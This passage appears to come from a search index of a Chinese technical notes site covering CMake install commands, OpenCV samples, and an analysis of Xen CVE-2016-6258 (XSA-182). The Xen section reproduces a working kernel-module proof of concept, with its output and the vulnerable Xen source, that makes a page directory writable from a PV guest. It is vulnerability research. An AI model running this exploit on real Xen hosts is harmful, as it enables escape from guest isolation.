\u4e2dvar\u7684\u503c\u3002@ONLY\u662f\u53ea\u8f6c\u6362@va@\u8fd9\u79cd\u53d8\u91cf","title":"cmake"},{"location":"module/makefile/cmake/#cmake","text":"cmake \u8bed\u6cd5","title":"cmake"},{"location":"module/makefile/cmake/#install-makefileinstall-target","text":"install( FILES flie DESTINATION dir_path ) #\u6267\u884cmake install\u65f6\uff0c\u628afile\u62f7\u8d1d\u5230dir_path install( PROGRAMS file DESTINATION dir_path ) #\u6267\u884cmake install\u65f6\uff0c\u628afile\u62f7\u8d1d\u5230dir_path,\u5e76\u7ed9\u4e88file\u53ef\u6267\u884c\u6743\u9650 INSTALL( TARGETS ylib ylib_s #RUNTIME DESTINATION xxx LIBRARY DESTINATION lib ARCHIVE DESTINATION lib ) # \u5b89\u88c5libylib.so\u5230lib\u76ee\u5f55\uff0c\u5b89\u88c5libylib_s.a\u5230lib\u76ee\u5f55\uff0cRUNTIME \u662f\u5b89\u88c5\u53ef\u6267\u884c\u6587\u4ef6\u5230xxx\u76ee\u5f55\uff0c\u6ce8\u610f\u8fd9\u4e2a\u6307\u4ee4\u6709\u4e2a\u5751\uff0c\u6211\u540e\u9762\u4f1a\u8bf4\u660e\u8fd9\u4e2a","title":"install \u6307\u4ee4\uff08\u4e3b\u8981\u662f\u751f\u6210Makefile\u4e2d\u7684install target\uff09"},{"location":"module/makefile/cmake/#configure_file","text":"configure_file( fileA fileB @ONLY ) #\u628afileA \u590d\u5236\u5e76\u91cd\u547d\u540d\u4e3afileB,\u6b64\u65f6\uff0cfileA\u4e2d\u7684@var@\u7684\u503c\u4f1a\u88ab\u66ff\u6362\u4e3acmakelists.txt \u4e2dvar\u7684\u503c\u3002@ONLY\u662f\u53ea\u8f6c\u6362@va@\u8fd9\u79cd\u53d8\u91cf","title":"configure_file"},{"location":"module/ndays/cve-2016-6258/","text":"CVE-2016-6258 \u00b6 The PV pagetable code has fast-paths for making updates to pre-existing pagetable entries, to skip expensive re-validation in safe cases (e.g. clearing only Access/Dirty bits). The bits considered safe were too broad, and not actually safe. https://xenbits.xen.org/xsa/advisory-182.html https://blog.quarkslab.com/xen-exploitation-part-3-xsa-182-qubes-escape.html https://www.blackhat.com/docs/us-16/materials/us-16-Luan-Ouroboros-Tearing-Xen-Hypervisor-With-The-Snake-wp.pdf \u8865\u4e01\u53ca\u5f71\u54cd\u7248\u672c \u00b6 xsa182.patch Xen 4.7.x xsa182-4.6.patch Xen 4.6.x xsa182-4.5.patch Xen 4.5.x, 4.4.x, 4.3.x \u5f71\u54cdPV\u865a\u62df\u673a \u73af\u5883\u642d\u5efa \u00b6 \u64cd\u4f5c\u7cfb\u7edf\uff1aUbuntu 16.04.3 LTS \u5185\u6838\u7248\u672c\uff1aLinux ubuntu 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux \u7f16\u8bd1\u7248\u672c\uff1a4.6.1 \u4e0b\u8f7d\u94fe\u63a5\uff1agit clone https://github.com/xen-project/xen.git -b RELEASE-4.6.1 \u7f16\u8bd1 \u00b6 \u53c2\u8003 link issue 1 \u00b6 \u5982\u4e0b ./configure --disable-qemu-traditional --with-extra-qemuu-configure-args = '--disable-werror' issue 2 \u00b6 /config/MiniOS.mk: No such file or directory \u4fee\u6539\u6587\u4ef6 extras/mini-os-remote/Makefile MINI-OS_ROOT = /home/pwd/xen-4.6.1/extras/mini-os include $(MINI-OS_ROOT)/config/MiniOS.mk \u542f\u52a8PV\u865a\u62df\u673aUbuntu \u00b6 https://blog.csdn.net/weixin_33872660/article/details/92324513 \u7f51\u6865xenbr0\u8bbe\u7f6e \u00b6 https://wiki.xenproject.org/wiki/Network_Configuration_Examples_(Xen_4.1%2B ) # add the below to /etc/network/interfaces iface xenbr0 inet dhcp bridge_ports [ your_eth ] /etc/init.d/networking restart ifup xenbr0 poc \u00b6 xsa-182-poc.c #include <linux/module.h> #include <linux/sched.h> #include <asm/xen/hypercall.h> #include <asm/xen/page.h> #define DEBUG(_f, _a...) printk(KERN_INFO \"xsa-182-poc:%d - \" _f \"\\n\", __LINE__, ## _a) #define __machine_addr(_v) ((unsigned long) arbitrary_virt_to_machine(_v).maddr) #define __mfn(_v) ((unsigned long) (__machine_addr(_v) >> PAGE_SHIFT)) int mmu_update ( unsigned long ptr, unsigned long val) { struct mmu_update mmu_updates; struct mmuext_op uops_tlb_flush_all[] = {{.cmd = MMUEXT_TLB_FLUSH_ALL}}; int rc; mmu_updates.ptr = ptr | MMU_NORMAL_PT_UPDATE; mmu_updates.val = val; rc = HYPERVISOR_mmu_update( & mmu_updates, 1 , NULL, DOMID_SELF); HYPERVISOR_mmuext_op(uops_tlb_flush_all, 1 , NULL, DOMID_SELF); return rc; } static int __init exploit_init ( void ) { int xen_version = HYPERVISOR_xen_version( 0 , NULL); unsigned long * page_directory = ( unsigned long * ) (current -> mm -> pgd); const unsigned long self_number = 42 ; /* from xen/include/asm-x86/config.h * 0xffff820000000000 - 0xffff827fffffffff [512GB, 2^39 bytes, PML4:260] * Per-domain mappings (e.g., GDT, LDT). */ const unsigned long target = 260 ; unsigned long * writable_page_directory = NULL; int rc; DEBUG( \"xen_version = %d.%d\" , (xen_version >> 16 ) & 0xFFFF , xen_version & 0xFFFF ); DEBUG( \"page_directory mfn = 0x%lx\" , __mfn(page_directory)); DEBUG( \"page_directory[%lu] = 0x%016lx\" , target, page_directory[target]); DEBUG( \"page_directory[%lu] = 0x%016lx\" , self_number, page_directory[self_number]); // create a self-mapping entry without RW flag rc = mmu_update(__machine_addr( & page_directory[self_number]), __machine_addr(page_directory) | _PAGE_USER | _PAGE_PRESENT); DEBUG( \"rc = 0x%x\" , rc); DEBUG( \"page_directory[%lu] = 0x%016lx\" , self_number, page_directory[self_number]); // fast path doesn't check RW flag ... rc = mmu_update(__machine_addr( & page_directory[self_number]), page_directory[self_number] | _PAGE_RW); DEBUG( \"rc = 0x%x\" , rc); DEBUG( \"page_directory[%lu] = 0x%016lx\" , self_number, page_directory[self_number]); if (rc != 0 ) { DEBUG( \"not vulnerable\" ); goto end; } // craft magic address writable_page_directory = ( unsigned long * ) ((self_number << 39 ) | (self_number << 30 ) | (self_number << 21 ) | (self_number << 12 )); DEBUG( \"writable_page_directory = 0x%p\" , writable_page_directory); // enjoy DEBUG( \"writable_page_directory[%lu] = 0x%016lx\" , target, writable_page_directory[target]); writable_page_directory[target] |= _PAGE_USER; DEBUG( \"writable_page_directory[%lu] = 0x%016lx\" , target, writable_page_directory[target]); DEBUG( \"vulnerable\" ); end: // reset entry because Linux is trying to unpin page & so on rc = mmu_update(__machine_addr( & page_directory[self_number]), 0x0 ); DEBUG( \"rc = 0x%x\" , rc); return 0 ; } static void __exit exploit_exit ( void ) { printk( \"goodbye! \\n \" ); } module_init(exploit_init); module_exit(exploit_exit); MODULE_LICENSE( \"GPL\" ); MODULE_AUTHOR( \"J\u00e9r\u00e9mie Boutoille\" ); MODULE_DESCRIPTION( \"XSA-182 proof of concept\" ); dmesg | grep xsa-182-poc [ 403 .764257 ] xsa-182-poc:38 - xen_version = 4 .6 [ 403 .764261 ] xsa-182-poc:39 - page_directory mfn = 0x6a3c0 [ 403 .764263 ] xsa-182-poc:40 - page_directory [ 260 ] = 0x000000006eb6e063 [ 403 .764266 ] xsa-182-poc:41 - page_directory [ 42 ] = 0x0000000000000000 [ 403 .764273 ] xsa-182-poc:45 - rc = 0x0 [ 403 .764275 ] xsa-182-poc:46 - page_directory [ 42 ] = 0x000000006a3c0005 [ 403 .764281 ] xsa-182-poc:50 - rc = 0x0 [ 403 .764284 ] xsa-182-poc:51 - page_directory [ 42 ] = 0x000000006a3c0007 [ 403 .764287 ] xsa-182-poc:59 - writable_page_directory = 0x0000150a8542a000 [ 403 .764290 ] xsa-182-poc:62 - writable_page_directory [ 260 ] = 0x000000006eb6e063 [ 403 .764292 ] xsa-182-poc:64 - writable_page_directory [ 260 ] = 0x000000006eb6e067 [ 403 .764295 ] xsa-182-poc:65 - vulnerable [ 403 .764301 ] xsa-182-poc:70 - rc = 0x0 # page_directory[260] \u7528\u6765\u9a8c\u8bc1\u662f\u5426\u53ef\u5199 # page_directory[42] \u7528\u6765\u5f15\u7528page_directory\u81ea\u8eab \u6f0f\u6d1e\u6210\u56e0 \u00b6 \u51fd\u6570mod_l2_entry\u4e2d\u7684FAST PATH\u6ca1\u6709\u8fc7\u591a\u7684\u9a8c\u8bc1\uff0c\u901a\u8fc7FAST PATH\u66f4\u6539_PAGE_RW\u5c5e\u6027 \u51fd\u6570get_##level##_linear_pagetable\u4e2d\u6ee1\u8db3\u4e00\u5b9a\u6761\u4ef6\u4f1a\u8df3\u8fc7\u90e8\u5206\u9a8c\u8bc1\uff0c\u4e0d\u5305\u62ec_PAGE_RW\u9a8c\u8bc1 \u9996\u5148\u5229\u75282\u521b\u5efa\u4e00\u4e2a\u53ea\u8bfb\u7684\uff0c\u5f15\u7528\u81ea\u8eab\u7684pdt\uff0c\u7136\u540e\u5229\u75281\u66f4\u6539_PAGE_RW\u5c5e\u6027\u3002 /* Update the L2 entry at pl2e to new value nl2e. pl2e is within frame pfn. */ static int mod_l2_entry (l2_pgentry_t * pl2e, l2_pgentry_t nl2e, unsigned long pfn, int preserve_ad, struct vcpu * vcpu) { l2_pgentry_t ol2e; struct domain * d = vcpu -> domain; struct page_info * l2pg = mfn_to_page(pfn); unsigned long type = l2pg -> u.inuse.type_info; int rc = 0 ; if ( unlikely( ! is_guest_l2_slot(d, type, pgentry_ptr_to_slot(pl2e))) ) { MEM_LOG( \"Illegal L2 update attempt in Xen-private area %p\" , pl2e); return - EPERM; } if ( unlikely(__copy_from_user( & ol2e, pl2e, sizeof (ol2e)) != 0 ) ) return - EFAULT; if ( l2e_get_flags(nl2e) & _PAGE_PRESENT ) { if ( unlikely(l2e_get_flags(nl2e) & L2_DISALLOW_MASK) ) { MEM_LOG( \"Bad L2 flags %x\" , l2e_get_flags(nl2e) & L2_DISALLOW_MASK); return - EINVAL; } /* Fast path for identical mapping and presence. */ if ( ! l2e_has_changed(ol2e, nl2e, unlikely(opt_allow_superpage) ? _PAGE_PSE | _PAGE_RW | _PAGE_PRESENT : _PAGE_PRESENT) ) { adjust_guest_l2e(nl2e, d); if ( UPDATE_ENTRY(l2, pl2e, ol2e, nl2e, pfn, vcpu, preserve_ad) ) return 0 ; return - EBUSY; } if ( unlikely((rc = get_page_from_l2e(nl2e, pfn, d)) < 0 ) ) return rc; adjust_guest_l2e(nl2e, d); if ( unlikely( ! UPDATE_ENTRY(l2, pl2e, ol2e, nl2e, pfn, vcpu, preserve_ad)) ) { ol2e = nl2e; rc = - EBUSY; } } else if ( unlikely( ! UPDATE_ENTRY(l2, pl2e, ol2e, nl2e, pfn, vcpu, preserve_ad)) ) { return - EBUSY; } put_page_from_l2e(ol2e, pfn); return rc; } get_page_from_l2e\u8c03\u7528get_page_and_type_from_pagenr\u9a8c\u8bc1page type\u662f\u5426\u5408\u6cd5\uff0c\u5982\u679c\u4e0d\u5408\u6cd5\uff0c\u5c06\u5f15\u5165get_l2_linear_pagetable\u53c2\u4e0e\u4e8c\u6b21\u9a8c\u8bc1 static int get_page_from_l2e ( l2_pgentry_t l2e, unsigned long pfn, struct domain * d) { unsigned long mfn = l2e_get_pfn(l2e); int rc; if ( ! (l2e_get_flags(l2e) & _PAGE_PRESENT) ) return 1 ; if ( unlikely((l2e_get_flags(l2e) & L2_DISALLOW_MASK)) ) { MEM_LOG( \"Bad L2 flags %x\" , l2e_get_flags(l2e) & L2_DISALLOW_MASK); return - EINVAL; } if ( ! (l2e_get_flags(l2e) & _PAGE_PSE) ) { rc = get_page_and_type_from_pagenr(mfn, PGT_l1_page_table, d, 0 , 0 ); if ( unlikely(rc == - EINVAL) && get_l2_linear_pagetable(l2e, pfn, d) ) rc = 0 ; return rc; } if ( ! opt_allow_superpage ) { MEM_LOG( \"Attempt to map superpage without allowsuperpage \" \"flag in hypervisor\" ); return - EINVAL; } if ( mfn & (L1_PAGETABLE_ENTRIES - 1 ) ) { MEM_LOG( \"Unaligned superpage map attempt mfn %lx\" , mfn); return - EINVAL; } return get_superpage(mfn, d); } \u5bf9\u4e8e\u6ca1\u6709_PAGE_RW\u7684L#TE\uff0c\u5176MFN\u5b57\u6bb5\u5c06\u4e0e\u5f53\u524dL#\u9875\u8868\u7684MFN\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u7b49\u4e8e\uff0c\u5219\u5ffd\u7565\u4e00\u4e9b\u9a8c\u8bc1\uff0c\u5e76\u8fd4\u56de1,\u901a\u8fc7\u9a8c\u8bc1\u3002\u539f\u672c\u7528\u4e8e\u9012\u5f52\uff0c\u6ca1\u6709\u8003\u8651\u5f15\u7528\u81ea\u8eab\u7684\u60c5\u51b5 static int \\ get_ ## level ## _linear_pagetable( \\ level ## _pgentry_t pde, unsigned long pde_pfn, struct domain * d) \\ { \\ unsigned long x, y; \\ struct page_info * page; \\ unsigned long pfn; \\ \\ if ( (level ## e_get_flags(pde) & _PAGE_RW) ) \\ { \\ MEM_LOG( \"Attempt to create linear p.t. with write perms\" ); \\ return 0 ; \\ } \\ \\ if ( (pfn = level ## e_get_pfn(pde)) != pde_pfn ) \\ { \\ //return 0 if validations failed \\ } \\ \\ return 1; \\ }","title":"CVE-2016-6258"},{"location":"module/ndays/cve-2016-6258/#cve-2016-6258","text":"The PV pagetable code has fast-paths for making updates to pre-existing pagetable entries, to skip expensive re-validation in safe cases (e.g. clearing only Access/Dirty bits). The bits considered safe were too broad, and not actually safe. https://xenbits.xen.org/xsa/advisory-182.html https://blog.quarkslab.com/xen-exploitation-part-3-xsa-182-qubes-escape.html https://www.blackhat.com/docs/us-16/materials/us-16-Luan-Ouroboros-Tearing-Xen-Hypervisor-With-The-Snake-wp.pdf","title":"CVE-2016-6258"},{"location":"module/ndays/cve-2016-6258/#_1","text":"xsa182.patch Xen 4.7.x xsa182-4.6.patch Xen 4.6.x xsa182-4.5.patch Xen 4.5.x, 4.4.x, 4.3.x \u5f71\u54cdPV\u865a\u62df\u673a","title":"\u8865\u4e01\u53ca\u5f71\u54cd\u7248\u672c"},{"location":"module/ndays/cve-2016-6258/#_2","text":"\u64cd\u4f5c\u7cfb\u7edf\uff1aUbuntu 16.04.3 LTS \u5185\u6838\u7248\u672c\uff1aLinux ubuntu 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux \u7f16\u8bd1\u7248\u672c\uff1a4.6.1 \u4e0b\u8f7d\u94fe\u63a5\uff1agit clone https://github.com/xen-project/xen.git -b RELEASE-4.6.1","title":"\u73af\u5883\u642d\u5efa"},{"location":"module/ndays/cve-2016-6258/#_3","text":"\u53c2\u8003 link","title":"\u7f16\u8bd1"},{"location":"module/ndays/cve-2016-6258/#issue-1","text":"\u5982\u4e0b ./configure --disable-qemu-traditional --with-extra-qemuu-configure-args = '--disable-werror'","title":"issue 1"},{"location":"module/ndays/cve-2016-6258/#issue-2","text":"/config/MiniOS.mk: No such file or directory \u4fee\u6539\u6587\u4ef6 extras/mini-os-remote/Makefile MINI-OS_ROOT = /home/pwd/xen-4.6.1/extras/mini-os include $(MINI-OS_ROOT)/config/MiniOS.mk","title":"issue 2"},{"location":"module/ndays/cve-2016-6258/#pvubuntu","text":"https://blog.csdn.net/weixin_33872660/article/details/92324513","title":"\u542f\u52a8PV\u865a\u62df\u673aUbuntu"},{"location":"module/ndays/cve-2016-6258/#xenbr0","text":"https://wiki.xenproject.org/wiki/Network_Configuration_Examples_(Xen_4.1%2B ) # add the below to /etc/network/interfaces iface xenbr0 inet dhcp bridge_ports [ your_eth ] /etc/init.d/networking restart ifup xenbr0","title":"\u7f51\u6865xenbr0\u8bbe\u7f6e"},{"location":"module/ndays/cve-2016-6258/#poc","text":"xsa-182-poc.c #include <linux/module.h> #include <linux/sched.h> #include <asm/xen/hypercall.h> #include <asm/xen/page.h> #define DEBUG(_f, _a...) printk(KERN_INFO \"xsa-182-poc:%d - \" _f \"\\n\", __LINE__, ## _a) #define __machine_addr(_v) ((unsigned long) arbitrary_virt_to_machine(_v).maddr) #define __mfn(_v) ((unsigned long) (__machine_addr(_v) >> PAGE_SHIFT)) int mmu_update ( unsigned long ptr, unsigned long val) { struct mmu_update mmu_updates; struct mmuext_op uops_tlb_flush_all[] = {{.cmd = MMUEXT_TLB_FLUSH_ALL}}; int rc; mmu_updates.ptr = ptr | MMU_NORMAL_PT_UPDATE; mmu_updates.val = val; rc = HYPERVISOR_mmu_update( & mmu_updates, 1 , NULL, DOMID_SELF); HYPERVISOR_mmuext_op(uops_tlb_flush_all, 1 , NULL, DOMID_SELF); return rc; } static int __init exploit_init ( void ) { int xen_version = HYPERVISOR_xen_version( 0 , NULL); unsigned long * page_directory = ( unsigned long * ) (current -> mm -> pgd); const unsigned long self_number = 42 ; /* from xen/include/asm-x86/config.h * 0xffff820000000000 - 0xffff827fffffffff [512GB, 2^39 bytes, PML4:260] * Per-domain mappings (e.g., GDT, LDT). */ const unsigned long target = 260 ; unsigned long * writable_page_directory = NULL; int rc; DEBUG( \"xen_version = %d.%d\" , (xen_version >> 16 ) & 0xFFFF , xen_version & 0xFFFF ); DEBUG( \"page_directory mfn = 0x%lx\" , __mfn(page_directory)); DEBUG( \"page_directory[%lu] = 0x%016lx\" , target, page_directory[target]); DEBUG( \"page_directory[%lu] = 0x%016lx\" , self_number, page_directory[self_number]); // create a self-mapping entry without RW flag rc = mmu_update(__machine_addr( & page_directory[self_number]), __machine_addr(page_directory) | _PAGE_USER | _PAGE_PRESENT); DEBUG( \"rc = 0x%x\" , rc); DEBUG( \"page_directory[%lu] = 0x%016lx\" , self_number, page_directory[self_number]); // fast path doesn't check RW flag ... rc = mmu_update(__machine_addr( & page_directory[self_number]), page_directory[self_number] | _PAGE_RW); DEBUG( \"rc = 0x%x\" , rc); DEBUG( \"page_directory[%lu] = 0x%016lx\" , self_number, page_directory[self_number]); if (rc != 0 ) { DEBUG( \"not vulnerable\" ); goto end; } // craft magic address writable_page_directory = ( unsigned long * ) ((self_number << 39 ) | (self_number << 30 ) | (self_number << 21 ) | (self_number << 12 )); DEBUG( \"writable_page_directory = 0x%p\" , writable_page_directory); // enjoy DEBUG( \"writable_page_directory[%lu] = 0x%016lx\" , target, writable_page_directory[target]); writable_page_directory[target] |= _PAGE_USER; DEBUG( \"writable_page_directory[%lu] = 0x%016lx\" , target, writable_page_directory[target]); DEBUG( \"vulnerable\" ); end: // reset entry because Linux is trying to unpin page & so on rc = mmu_update(__machine_addr( & page_directory[self_number]), 0x0 ); DEBUG( \"rc = 0x%x\" , rc); return 0 ; } static void __exit exploit_exit ( void ) { printk( \"goodbye! \\n \" ); } module_init(exploit_init); module_exit(exploit_exit); MODULE_LICENSE( \"GPL\" ); MODULE_AUTHOR( \"J\u00e9r\u00e9mie Boutoille\" ); MODULE_DESCRIPTION( \"XSA-182 proof of concept\" ); dmesg | grep xsa-182-poc [ 403 .764257 ] xsa-182-poc:38 - xen_version = 4 .6 [ 403 .764261 ] xsa-182-poc:39 - page_directory mfn = 0x6a3c0 [ 403 .764263 ] xsa-182-poc:40 - page_directory [ 260 ] = 0x000000006eb6e063 [ 403 .764266 ] xsa-182-poc:41 - page_directory [ 42 ] = 0x0000000000000000 [ 403 .764273 ] xsa-182-poc:45 - rc = 0x0 [ 403 .764275 ] xsa-182-poc:46 - page_directory [ 42 ] = 0x000000006a3c0005 [ 403 .764281 ] xsa-182-poc:50 - rc = 0x0 [ 403 .764284 ] xsa-182-poc:51 - page_directory [ 42 ] = 0x000000006a3c0007 [ 403 .764287 ] xsa-182-poc:59 - writable_page_directory = 0x0000150a8542a000 [ 403 .764290 ] xsa-182-poc:62 - writable_page_directory [ 260 ] = 0x000000006eb6e063 [ 403 .764292 ] xsa-182-poc:64 - writable_page_directory [ 260 ] = 0x000000006eb6e067 [ 403 .764295 ] xsa-182-poc:65 - vulnerable [ 403 .764301 ] xsa-182-poc:70 - rc = 0x0 # page_directory[260] \u7528\u6765\u9a8c\u8bc1\u662f\u5426\u53ef\u5199 # page_directory[42] \u7528\u6765\u5f15\u7528page_directory\u81ea\u8eab","title":"poc"},{"location":"module/ndays/cve-2016-6258/#_4","text":"\u51fd\u6570mod_l2_entry\u4e2d\u7684FAST PATH\u6ca1\u6709\u8fc7\u591a\u7684\u9a8c\u8bc1\uff0c\u901a\u8fc7FAST PATH\u66f4\u6539_PAGE_RW\u5c5e\u6027 \u51fd\u6570get_##level##_linear_pagetable\u4e2d\u6ee1\u8db3\u4e00\u5b9a\u6761\u4ef6\u4f1a\u8df3\u8fc7\u90e8\u5206\u9a8c\u8bc1\uff0c\u4e0d\u5305\u62ec_PAGE_RW\u9a8c\u8bc1 \u9996\u5148\u5229\u75282\u521b\u5efa\u4e00\u4e2a\u53ea\u8bfb\u7684\uff0c\u5f15\u7528\u81ea\u8eab\u7684pdt\uff0c\u7136\u540e\u5229\u75281\u66f4\u6539_PAGE_RW\u5c5e\u6027\u3002 /* Update the L2 entry at pl2e to new value nl2e. pl2e is within frame pfn. */ static int mod_l2_entry (l2_pgentry_t * pl2e, l2_pgentry_t nl2e, unsigned long pfn, int preserve_ad, struct vcpu * vcpu) { l2_pgentry_t ol2e; struct domain * d = vcpu -> domain; struct page_info * l2pg = mfn_to_page(pfn); unsigned long type = l2pg -> u.inuse.type_info; int rc = 0 ; if ( unlikely( ! is_guest_l2_slot(d, type, pgentry_ptr_to_slot(pl2e))) ) { MEM_LOG( \"Illegal L2 update attempt in Xen-private area %p\" , pl2e); return - EPERM; } if ( unlikely(__copy_from_user( & ol2e, pl2e, sizeof (ol2e)) != 0 ) ) return - EFAULT; if ( l2e_get_flags(nl2e) & _PAGE_PRESENT ) { if ( unlikely(l2e_get_flags(nl2e) & L2_DISALLOW_MASK) ) { MEM_LOG( \"Bad L2 flags %x\" , l2e_get_flags(nl2e) & L2_DISALLOW_MASK); return - EINVAL; } /* Fast path for identical mapping and presence. */ if ( ! l2e_has_changed(ol2e, nl2e, unlikely(opt_allow_superpage) ? _PAGE_PSE | _PAGE_RW | _PAGE_PRESENT : _PAGE_PRESENT) ) { adjust_guest_l2e(nl2e, d); if ( UPDATE_ENTRY(l2, pl2e, ol2e, nl2e, pfn, vcpu, preserve_ad) ) return 0 ; return - EBUSY; } if ( unlikely((rc = get_page_from_l2e(nl2e, pfn, d)) < 0 ) ) return rc; adjust_guest_l2e(nl2e, d); if ( unlikely( ! UPDATE_ENTRY(l2, pl2e, ol2e, nl2e, pfn, vcpu, preserve_ad)) ) { ol2e = nl2e; rc = - EBUSY; } } else if ( unlikely( ! UPDATE_ENTRY(l2, pl2e, ol2e, nl2e, pfn, vcpu, preserve_ad)) ) { return - EBUSY; } put_page_from_l2e(ol2e, pfn); return rc; } get_page_from_l2e\u8c03\u7528get_page_and_type_from_pagenr\u9a8c\u8bc1page type\u662f\u5426\u5408\u6cd5\uff0c\u5982\u679c\u4e0d\u5408\u6cd5\uff0c\u5c06\u5f15\u5165get_l2_linear_pagetable\u53c2\u4e0e\u4e8c\u6b21\u9a8c\u8bc1 static int get_page_from_l2e ( l2_pgentry_t l2e, unsigned long pfn, struct domain * d) { unsigned long mfn = l2e_get_pfn(l2e); int rc; if ( ! (l2e_get_flags(l2e) & _PAGE_PRESENT) ) return 1 ; if ( unlikely((l2e_get_flags(l2e) & L2_DISALLOW_MASK)) ) { MEM_LOG( \"Bad L2 flags %x\" , l2e_get_flags(l2e) & L2_DISALLOW_MASK); return - EINVAL; } if ( ! (l2e_get_flags(l2e) & _PAGE_PSE) ) { rc = get_page_and_type_from_pagenr(mfn, PGT_l1_page_table, d, 0 , 0 ); if ( unlikely(rc == - EINVAL) && get_l2_linear_pagetable(l2e, pfn, d) ) rc = 0 ; return rc; } if ( ! opt_allow_superpage ) { MEM_LOG( \"Attempt to map superpage without allowsuperpage \" \"flag in hypervisor\" ); return - EINVAL; } if ( mfn & (L1_PAGETABLE_ENTRIES - 1 ) ) { MEM_LOG( \"Unaligned superpage map attempt mfn %lx\" , mfn); return - EINVAL; } return get_superpage(mfn, d); } \u5bf9\u4e8e\u6ca1\u6709_PAGE_RW\u7684L#TE\uff0c\u5176MFN\u5b57\u6bb5\u5c06\u4e0e\u5f53\u524dL#\u9875\u8868\u7684MFN\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u7b49\u4e8e\uff0c\u5219\u5ffd\u7565\u4e00\u4e9b\u9a8c\u8bc1\uff0c\u5e76\u8fd4\u56de1,\u901a\u8fc7\u9a8c\u8bc1\u3002\u539f\u672c\u7528\u4e8e\u9012\u5f52\uff0c\u6ca1\u6709\u8003\u8651\u5f15\u7528\u81ea\u8eab\u7684\u60c5\u51b5 static int \\ get_ ## level ## _linear_pagetable( \\ level ## _pgentry_t pde, unsigned long pde_pfn, struct domain * d) \\ { \\ unsigned long x, y; \\ struct page_info * page; \\ unsigned long pfn; \\ \\ if ( (level ## e_get_flags(pde) & _PAGE_RW) ) \\ { \\ MEM_LOG( \"Attempt to create linear p.t. with write perms\" ); \\ return 0 ; \\ } \\ \\ if ( (pfn = level ## e_get_pfn(pde)) != pde_pfn ) \\ { \\ //return 0 if validations failed \\ } \\ \\ return 1; \\ }","title":"\u6f0f\u6d1e\u6210\u56e0"},{"location":"module/opencv/opencv-aruco/","text":"ArUco Marker Detection \u00b6 ArUco \u00b6 \u5148\u4ecb\u7ecdArUco Augmented reality library based on OpenCV \u57fa\u4e8eopencv\u7684\u589e\u5f3a\u73b0\u5b9e\u5e93 ArUco is an easy-to-use C++ library for detection of squared planar markers based on OpenCv. It can detect markers from a variety of ditionaries ARUCO, APRILTAGS, ARTAG and ARTOOLKIT+. It is a library, to rule them all ;) ArUco\u662f\u7528\u4e8e\u4fa6\u6d4b\u65b9\u5f62\u5e73\u9762\u6807\u8bb0\u7684c++\u5e93\uff0c\u57fa\u4e8eopencv\uff0c\u6613\u4e8e\u4f7f\u7528\u3002","title":"aruco"},{"location":"module/opencv/opencv-aruco/#aruco-marker-detection","text":"","title":"ArUco Marker Detection"},{"location":"module/opencv/opencv-aruco/#aruco","text":"\u5148\u4ecb\u7ecdArUco Augmented reality library based on OpenCV \u57fa\u4e8eopencv\u7684\u589e\u5f3a\u73b0\u5b9e\u5e93 ArUco is an easy-to-use C++ library for detection of squared planar markers based on OpenCv. It can detect markers from a variety of ditionaries ARUCO, APRILTAGS, ARTAG and ARTOOLKIT+. It is a library, to rule them all ;) ArUco\u662f\u7528\u4e8e\u4fa6\u6d4b\u65b9\u5f62\u5e73\u9762\u6807\u8bb0\u7684c++\u5e93\uff0c\u57fa\u4e8eopencv\uff0c\u6613\u4e8e\u4f7f\u7528\u3002","title":"ArUco"},{"location":"module/opencv/opencv-bgsegm/","text":"opencv \u524d\u666f\u68c0\u6d4b \u00b6 Improved Background-Foreground Segmentation Methods https://blog.csdn.net/Anderson_Y/article/details/82082095 sample \u00b6 // bgfp vtest.avi #include \"opencv2/bgsegm.hpp\" #include \"opencv2/videoio.hpp\" #include \"opencv2/highgui.hpp\" #include <opencv2/core/utility.hpp> #include <iostream> using namespace cv; using namespace cv :: bgsegm; const String about = \" \\n A program demonstrating the use and capabilities of different background subtraction algorithms \\n \" \"Using OpenCV version \" + String(CV_VERSION) + \" \\n\\n Press 'c' to change the algorithm\" \" \\n Press 'm' to toggle showing only foreground mask or ghost effect\" \" \\n Press 'n' to change number of threads\" \" \\n Press SPACE to toggle wait delay of imshow\" \" \\n Press 'q' or ESC to exit \\n \" ; const String algos[ 7 ] = { \"GMG\" , \"CNT\" , \"KNN\" , \"MOG\" , \"MOG2\" , \"GSOC\" , \"LSBP\" }; static Ptr < BackgroundSubtractor > createBGSubtractorByName( const String & algoName) { Ptr < BackgroundSubtractor > algo; if (algoName == String( \"GMG\" )) algo = createBackgroundSubtractorGMG( 20 , 0.7 ); else if (algoName == String( \"CNT\" )) algo = createBackgroundSubtractorCNT(); else if (algoName == String( \"KNN\" )) algo = createBackgroundSubtractorKNN(); else if (algoName == String( \"MOG\" )) algo = createBackgroundSubtractorMOG(); else if (algoName == String( \"MOG2\" )) algo = createBackgroundSubtractorMOG2(); else if (algoName == String( \"GSOC\" )) algo = createBackgroundSubtractorGSOC(); else if (algoName == String( \"LSBP\" )) algo = createBackgroundSubtractorLSBP(); return algo; } int main( int argc, char ** argv) { CommandLineParser parser(argc, argv, \"{@video | vtest.avi | path to a video file}\" ); parser.about(about); parser.printMessage(); String videoPath = samples :: findFile(parser.get < String > ( 0 ),false); Ptr < BackgroundSubtractor > bgfs = createBGSubtractorByName(algos[ 0 ]); VideoCapture cap; cap.open(videoPath); if ( ! cap.isOpened()) { std :: cerr << \"Cannot read video. Try moving video file to sample directory.\" << std :: endl; return - 1 ; } Mat frame, fgmask, segm; int delay = 0 ; int algo_index = 0 ; int nthreads = getNumberOfCPUs(); bool show_fgmask = false; for (;;) { cap >> frame; if (frame.empty()) { cap.set(CAP_PROP_POS_FRAMES, 0 ); cap >> frame; } bgfs -> apply(frame, fgmask); if (show_fgmask) segm = fgmask; else { frame.convertTo(segm, CV_8U, 0.5 ); add(frame, Scalar( 100 , 100 , 0 ), segm, fgmask); } putText(segm, algos[algo_index], Point( 10 , 30 ), FONT_HERSHEY_PLAIN, 2.0 , Scalar( 255 , 0 , 255 ), 2 , LINE_AA); putText(segm, format( \"%d threads\" , nthreads), Point( 10 , 60 ), FONT_HERSHEY_PLAIN, 2.0 , Scalar( 255 , 0 , 255 ), 2 , LINE_AA); imshow( \"FG Segmentation\" , segm); int c = waitKey(delay); if (c == ' ' ) delay = delay == 30 